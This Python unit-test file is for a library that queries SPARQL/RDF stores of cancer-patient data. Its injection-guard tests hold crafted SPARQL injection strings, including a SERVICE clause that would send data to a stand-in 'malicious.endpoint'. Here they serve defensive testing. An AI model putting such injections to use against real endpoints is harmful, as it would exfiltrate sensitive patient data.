"""
Unit tests for library functions.

Test the actual library functionality rather than external libraries.
"""

import sys

import pandas as pd
import pytest

from importlib import import_module
from pathlib import Path

# Add src directory to path for importing library functions
sys.path.insert(0, str(Path(__file__).parent.parent.parent / "src"))

from vantage6.algorithm.tools.exceptions import (  # noqa: E402
    AlgorithmError,
    UserInputError,
)

from vantage6_strongaya_rdf.data_processing import (  # noqa: E402
    add_missing_data_info,
    extract_subclass_info,
)
from vantage6_strongaya_rdf.schema_loader import load_schema  # noqa: E402
from vantage6_strongaya_rdf.sparql_client import post_sparql_query  # noqa: E402

# The package re-exports the collect_sparql_data function under the name of its module,
# which is why the module itself is imported explicitly
data_collection = import_module("vantage6_strongaya_rdf.collect_sparql_data")

# Endpoint that must never be reached; the tests below prove that no query is posted
UNREACHABLE_ENDPOINT = "http://localhost:7200/repositories/unreachable"

# The guard is applied before the template is filled in, so its contents are immaterial
UNUSED_QUERY_TEMPLATE = "SELECT * WHERE { ?subject ?predicate ?object }"

# Variables that the AYA cancer schema describes; used as the harmless counterpart
BIOLOGICAL_SEX = "ncit:C28421"
AGE_AT_INITIAL_DIAGNOSIS = "ncit:C156420"

# A keyword that no variable, ontology or property may consist of
FORBIDDEN_KEYWORD = "UNION"

# Injection that the integration configuration describes; it embeds a federated query
# that would make the node hand its data to another endpoint altogether
INJECTED_VARIABLE = (
    "<http://example.org/predicate> UNION { SERVICE <http://malicious.endpoint/sparql> "
    "{ SELECT ?data WHERE { ?s ?p ?data } } }"
)


class TestDataProcessing:
    """Test data processing functions."""

    def test_add_missing_data_info(self):
        """Test adding missing data information to DataFrame."""
        # Create test DataFrame
        df = pd.DataFrame(
            {
                "patient_id": ["P1", "P2", "P3"],
                "variable1": [1, None, 3],
                "variable2": ["A", "B", None],
            }
        )

        # Add missing data info with placeholder value
        add_missing_data_info(df, None)

        # Check that predetermined_info attribute was added
        assert hasattr(df, "predetermined_info")

    def test_extract_subclass_info_with_subclass(self):
        """Test extracting subclass information when sub_class column exists."""
        # Create test DataFrame with sub_class column
        df = pd.DataFrame(
            {
                "patient_id": ["P1", "P2", "P3"],
                "any_value": ["val1", "val2", "val3"],
                "sub_class": ["subclass1", "", "subclass3"],
            }
        )

        result = extract_subclass_info(df, "test_variable")

        # Check that sub_class and value columns are removed
        assert "sub_class" not in result.columns
        assert "any_value" not in result.columns

        # Check that the variable column was created
        assert "test_variable" in result.columns

        # Check that subclass info is properly used
        assert result.iloc[0]["test_variable"] == "subclass1"  # Has subclass
        assert result.iloc[1]["test_variable"] == "val2"  # Empty subclass, use value
        assert result.iloc[2]["test_variable"] == "subclass3"  # Has subclass

    def test_extract_subclass_info_without_subclass(self):
        """Test extracting subclass information when sub_class column doesn't exist."""
        # Create test DataFrame without sub_class column
        df = pd.DataFrame(
            {"patient_id": ["P1", "P2", "P3"], "any_value": ["val1", "val2", "val3"]}
        )

        result = extract_subclass_info(df, "test_variable")

        # Check that value column was renamed to variable name
        assert "any_value" not in result.columns
        assert "test_variable" in result.columns

        # Check that values are preserved
        assert result.iloc[0]["test_variable"] == "val1"
        assert result.iloc[1]["test_variable"] == "val2"
        assert result.iloc[2]["test_variable"] == "val3"


class TestSparqlClient:
    """Test SPARQL client functions."""

    def test_post_sparql_query_invalid_endpoint(self):
        """Test SPARQL client with invalid endpoint."""
        # This should handle gracefully and not crash
        query = "SELECT ?s ?p ?o WHERE { ?s ?p ?o . } LIMIT 1"

        # Retries are turned off, as this test is about the failure itself rather
        # than about the retry behaviour, which is covered separately
        try:
            result = post_sparql_query(
                "http://invalid-endpoint:9999/sparql", query, max_retries=0
            )
            # If it doesn't raise an exception, result should be None or empty
            assert result is None or result == []
        except Exception as e:
            # Should raise a connection-related exception
            assert "connection" in str(e).lower() or "refused" in str(e).lower()


@pytest.fixture
def unposted_queries(monkeypatch):
    """Keep any query from being posted and record the attempts to post one.

    The guard against dangerous input must reject a variable before a query is built,
    let alone posted; an endpoint that raises when it is contacted turns a query that
    escapes the guard into a failure rather than into a request that a store - and
    possibly a third party - would receive.
    """
    posted_queries = []

    def refuse_to_post(endpoint: str, query: str, **kwargs):
        posted_queries.append(query)
        raise AssertionError(f"A query was posted to {endpoint}: {query}")

    monkeypatch.setattr(data_collection, "post_sparql_query", refuse_to_post)
    return posted_queries


class TestMultiColumnInjectionGuard:
    """Test that the multi-column query rejects dangerous input.

    The multi-column query builds a single query out of two variables, which means
    that the guard has to be applied to either of them. Only the single-column path
    was covered previously, so the second variable of a multi-column query - the
    path that is the easiest to overlook - was never verified at all.
    """

    def test_dangerous_first_variable_is_rejected(self, unposted_queries):
        """Test that the first variable of a multi-column query is guarded."""
        with pytest.raises(UserInputError) as error:
            data_collection._process_multi_column_query(
                UNREACHABLE_ENDPOINT,
                UNUSED_QUERY_TEMPLATE,
                [FORBIDDEN_KEYWORD, AGE_AT_INITIAL_DIAGNOSIS],
                "dbo:has_column",
            )

        assert "Potentially dangerous input" in str(error.value)
        assert unposted_queries == []

    def test_dangerous_second_variable_is_rejected(self, unposted_queries):
        """Test that the second variable of a multi-column query is guarded as well.

        A guard that stops at the first variable would let the second one through, so
        an algorithm could smuggle dangerous input past it simply by ordering the two
        variables the other way round.
        """
        with pytest.raises(UserInputError) as error:
            data_collection._process_multi_column_query(
                UNREACHABLE_ENDPOINT,
                UNUSED_QUERY_TEMPLATE,
                [BIOLOGICAL_SEX, FORBIDDEN_KEYWORD],
                "dbo:has_column",
            )

        assert "Potentially dangerous input" in str(error.value)
        assert unposted_queries == []

    def test_dangerous_variable_property_is_rejected(self, unposted_queries):
        """Test that the variable property is guarded too.

        The property is substituted into the query just like a variable is, and it is
        configurable through the environment of a node.
        """
        with pytest.raises(UserInputError) as error:
            data_collection._process_multi_column_query(
                UNREACHABLE_ENDPOINT,
                UNUSED_QUERY_TEMPLATE,
                [BIOLOGICAL_SEX, AGE_AT_INITIAL_DIAGNOSIS],
                FORBIDDEN_KEYWORD,
            )

        assert "Potentially dangerous input" in str(error.value)
        assert unposted_queries == []

    def test_rejection_surfaces_as_an_algorithm_error(self, unposted_queries):
        """Test that a rejected variable surfaces to the algorithm that requested it.

        The collection function wraps the errors of a multi-column query in an
        AlgorithmError, which is what a node reports back. The rejection must
        therefore not be swallowed on its way out, and the reason for it must remain
        legible in the error that arrives.
        """
        with pytest.raises(AlgorithmError) as error:
            data_collection.collect_sparql_data(
                [BIOLOGICAL_SEX, FORBIDDEN_KEYWORD],
                query_type="multi_column",
                endpoint=UNREACHABLE_ENDPOINT,
            )

        # UserInputError is itself an AlgorithmError, so the wrapping is asserted on
        # the exact type as well as on the message that it carries
        assert type(error.value) is AlgorithmError
        assert "Error processing multi-column query" in str(error.value)
        assert "Potentially dangerous input" in str(error.value)
        assert unposted_queries == []

    def test_harmless_variables_are_not_rejected(self, monkeypatch):
        """Test that two legitimate variables are queried rather than rejected.

        Without this counterpart, a guard that rejected everything would satisfy the
        tests above whilst making the library useless.
        """
        monkeypatch.setattr(
            data_collection, "post_sparql_query", lambda endpoint, query, **kwargs: []
        )

        result = data_collection._process_multi_column_query(
            UNREACHABLE_ENDPOINT,
            UNUSED_QUERY_TEMPLATE,
            [BIOLOGICAL_SEX, AGE_AT_INITIAL_DIAGNOSIS],
            "dbo:has_column",
        )

        assert list(result.columns) == [
            "patient_id",
            BIOLOGICAL_SEX,
            AGE_AT_INITIAL_DIAGNOSIS,
        ]

    def test_embedded_injection_is_rejected(self, unposted_queries):
        """Test that a variable that embeds a federated query is rejected.

        This is the injection that the integration configuration describes: a variable
        that closes the triple pattern it is substituted into and continues with a
        SERVICE clause, which would hand the node's data to another endpoint. Comparing
        each keyword with the variable as a whole did not detect it, which meant that
        the query was posted and the protection depended on the store refusing it.
        """
        with pytest.raises(UserInputError):
            data_collection._process_multi_column_query(
                UNREACHABLE_ENDPOINT,
                UNUSED_QUERY_TEMPLATE,
                [BIOLOGICAL_SEX, INJECTED_VARIABLE],
                "dbo:has_column",
            )

        assert unposted_queries == []


class TestInputSafety:
    """Test the verification of the input that is substituted into a query."""

    @pytest.mark.parametrize(
        "variable",
        [
            "ncit:C28421",
            "age_at_initial_diagnosis",
            "Variable_1",
            "ncit:C-does-not-exist",
            "<http://ncicb.nci.nih.gov/xml/owl/EVS/Thesaurus.owl#C28421>",
        ],
    )
    def test_legitimate_variables_are_accepted(self, variable):
        """Test that the shapes that a variable actually takes are accepted.

        A variable is a class code, the name of a schema variable or an IRI; a guard
        that refused any of these would make the library unusable, which is why the
        shapes that occur in practice are asserted alongside the ones that are refused.
        """
        # Should not raise
        data_collection._verify_input_safety(variable, "dbo:has_column")

    @pytest.mark.parametrize(
        "variable_property",
        [
            "dbo:has_column",
            "sio:SIO_000255/sio:SIO_000008",
            "(sio:SIO_000253|sio:SIO_000233)/sio:SIO_000008",
            "<http://um-cds/ontologies/databaseontology/has_column>",
        ],
    )
    def test_legitimate_properties_are_accepted(self, variable_property):
        """Test that a property path is accepted as a variable property.

        The schema-derived paths are sequences of several predicates, and a node may
        configure its own property; both have to remain usable.
        """
        # Should not raise
        data_collection._verify_input_safety("ncit:C28421", variable_property)

    def test_every_variable_of_the_schema_is_accepted(self):
        """Test that no variable of the bundled schema is refused by the guard.

        The schema is updated automatically, so a variable that the guard happens to
        refuse would make that single variable unqueryable without anything else
        failing. Verifying every name at once keeps that from going unnoticed.
        """
        schema = load_schema(use_remote=False)
        variables = schema.get("schema", {}).get("variables", {})

        refused = []
        for variable_name, definition in variables.items():
            for candidate in [variable_name, definition.get("class")]:
                if not candidate:
                    continue
                try:
                    data_collection._verify_input_safety(candidate, "dbo:has_column")
                except UserInputError as error:
                    refused.append(f"{candidate}: {error}")

        assert not refused, f"The guard refuses schema variables: {refused}"

    @pytest.mark.parametrize(
        "variable",
        [
            INJECTED_VARIABLE,
            FORBIDDEN_KEYWORD,
            "?patient",
            "ncit:C28421 . ?s ?p ?o",
            "ncit:C28421}",
            '"ncit:C28421"',
            "ncit:C28421 # comment",
            "<http://example.org/a b>",
        ],
    )
    def test_dangerous_variables_are_refused(self, variable):
        """Test that any input that could extend the query is refused.

        The variable is substituted into the query template as it is, so whitespace, a
        brace, a quotation mark or a hash would allow it to close the triple pattern
        that it is part of and to continue with a clause of its own.
        """
        with pytest.raises(UserInputError):
            data_collection._verify_input_safety(variable, "dbo:has_column")

    @pytest.mark.parametrize(
        "variable_property",
        [
            "dbo:has_column } SERVICE <http://malicious.endpoint/sparql> {",
            "dbo:has_column ; dbo:has_cell",
            "SERVICE",
        ],
    )
    def test_dangerous_properties_are_refused(self, variable_property):
        """Test that a variable property cannot extend the query either.

        The property is substituted into the same triple pattern as the variable, and a
        node's environment can set it, which makes it just as much of a way in.
        """
        with pytest.raises(UserInputError):
            data_collection._verify_input_safety("ncit:C28421", variable_property)


class TestAssignPatientId:
    """Test the determination of the patient identifier of a query result."""

    def test_results_without_an_identifier_are_rejected(self):
        """Test that results that hold no identifier at all are rejected.

        Every query binds a patient identifier, so its absence means that the results
        do not describe patients. Continuing with such results would yield a dataset
        whose rows cannot be attributed to anyone, which is worse than an error.
        """
        result_df = pd.DataFrame(
            {
                "patient": ["http://data.local/rdf/data/record_one"],
                "any_value": ["27"],
            }
        )

        with pytest.raises(AlgorithmError) as error:
            data_collection._assign_patient_id(result_df, AGE_AT_INITIAL_DIAGNOSIS)

        assert AGE_AT_INITIAL_DIAGNOSIS in str(error.value)
        assert "patient identifier" in str(error.value)

    def test_identifiers_are_returned_as_text(self):
        """Test that identifiers are kept as text rather than coerced to numbers.

        An RDF-store returns identifiers as text, and a dataset's identifiers are
        often numeric-looking text with leading zeros. Converting them to numbers
        would make the type of the identifier depend on the values of a single
        variable, after which the variables of separate tables no longer merge.
        """
        result_df = data_collection._assign_patient_id(
            pd.DataFrame({"patientID": [1, 2, 10, "0001"], "any_value": list("abcd")}),
            AGE_AT_INITIAL_DIAGNOSIS,
        )

        assert list(result_df["patient_id"]) == ["1", "2", "10", "0001"]
        assert all(
            isinstance(identifier, str) for identifier in result_df["patient_id"]
        )

    def test_record_uri_columns_are_dropped(self):
        """Test that the columns that hold a record's URI are not part of the results.

        The URI of a record is a means of resolving the patient's identity rather than
        an observation, and it would identify the node's records to whoever receives
        the collected data.
        """
        result_df = data_collection._assign_patient_id(
            pd.DataFrame(
                {
                    "patient": ["http://data.local/rdf/data/record_one"],
                    "p1": ["http://data.local/rdf/data/record_one"],
                    "p2": ["http://data.local/rdf/data/record_two"],
                    "patientID": ["ID_0001"],
                    "any_value": ["27"],
                }
            ),
            AGE_AT_INITIAL_DIAGNOSIS,
        )

        assert list(result_df.columns) == ["any_value", "patient_id"]
        assert list(result_df["patient_id"]) == ["ID_0001"]

    def test_records_identified_by_their_own_uri_are_reported(self, capsys):
        """Test that a record whose identifier could not be retrieved is reported.

        Such a record is identified by its own URI so that it is still observed and
        counted, but it cannot be linked to the records of another table; that is a
        limitation of the collected data which has to be visible in the logs.
        """
        record_uri = "http://data.local/rdf/data/record_one"

        data_collection._assign_patient_id(
            pd.DataFrame(
                {
                    "p1": [record_uri, "http://data.local/rdf/data/record_two"],
                    "patientID": [record_uri, "ID_0002"],
                    "any_value": ["27", "31"],
                }
            ),
            AGE_AT_INITIAL_DIAGNOSIS,
        )

        logged = capsys.readouterr().out
        assert "Could not retrieve the identifier of 1 record(s)" in logged


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
